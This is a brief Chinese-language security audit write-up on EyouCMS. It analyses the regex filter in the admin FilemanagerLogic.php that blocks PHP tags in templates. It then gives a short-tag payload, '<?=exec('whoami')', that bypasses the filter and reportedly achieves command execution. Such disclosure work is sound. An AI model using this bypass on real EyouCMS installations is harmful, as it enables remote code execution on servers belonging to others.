

0x00 漏洞定位分析


漏洞定位到关键文件application\admin\logic\FilemanagerLogic.php 


```
$content = htmlspecialchars_decode($content, ENT_QUOTES);
            if (preg_match('#<([^?]*)\?php#i', $content) || (preg_match('#<\?#i', $content) && preg_match('#\?>#i', $content)) || preg_match('#\{eyou\:php([^\}]*)\}#i', $content) || preg_match('#\{php([^\}]*)\}#i', $content)) {
                return "模板里不允许有php语法，为了安全考虑，请通过FTP工具进行编辑上传。";
            }

```

很明显主要的目的是不让传带php标签的内容，大体规则如下。
1、内容中不能有<?php

2、内容中不能同时有<? 和?>

3、内容中不能有{eyou:phpxxx

4、内容中不能有{php xxx

0x01 EXP编写

很明显插入 <?=exec('whoami')能进行绕过

![图片](https://github.com/Londly01/audit-hub/assets/118274389/4140dd3a-ed30-442d-8e26-ba45601521e4)


成功命令执行

![图片](https://github.com/Londly01/audit-hub/assets/118274389/21b24246-0796-405d-b0e7-c0bbbc17ab66)





